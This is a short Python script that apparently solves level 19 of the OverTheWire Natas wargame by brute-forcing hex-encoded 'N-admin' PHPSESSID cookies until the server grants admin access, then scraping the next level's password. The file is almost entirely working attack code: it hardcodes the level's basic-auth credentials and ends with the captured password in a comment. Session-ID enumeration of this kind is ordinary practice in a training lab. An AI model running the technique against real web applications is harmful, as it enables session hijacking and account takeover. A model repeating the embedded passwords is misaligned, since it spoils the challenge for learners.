import requests
import binascii
import codecs
import re

url = 'http://natas19.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(1,641):
    cookies = {'PHPSESSID': binascii.hexlify((str(i)+'-admin').encode()).decode()}
    response = requests.post(url,auth=auth,cookies=cookies)

    print(i)
    if 'You are an admin.' in response.text:
        password = re.findall('Password: (.*)</pre>', response.text)
        print(password[0])
        break

# eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
